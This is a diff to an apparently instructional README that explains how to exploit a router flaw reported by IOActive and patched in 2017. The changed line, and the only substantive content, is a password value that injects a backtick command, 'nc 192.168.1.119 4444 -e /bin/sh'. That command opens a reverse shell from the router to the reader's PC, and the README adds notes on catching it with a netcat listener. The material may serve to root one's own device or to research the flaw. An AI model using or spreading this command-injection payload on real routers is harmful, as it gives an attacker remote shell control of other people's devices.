@@ -78,7 +78,7 @@ This exploit was discovered by IOActive and patched in 2017 (It's still possible
  2. Go to the "Connectivity" menu
  3. Change the router password to the following (with the correct command):
 
-    ```admin\`nc 192.168.1.119 4444 -e /bin/sh\` &```
+    ```admin`nc 192.168.1.119 4444 -e /bin/sh` &```
     
 ### (make sure to change ```192.168.1.119``` to your PCs local IP)
 ### If the netcat listener says that the router connected but shows no text output, that means it's working but it only outputs text when you run a command.
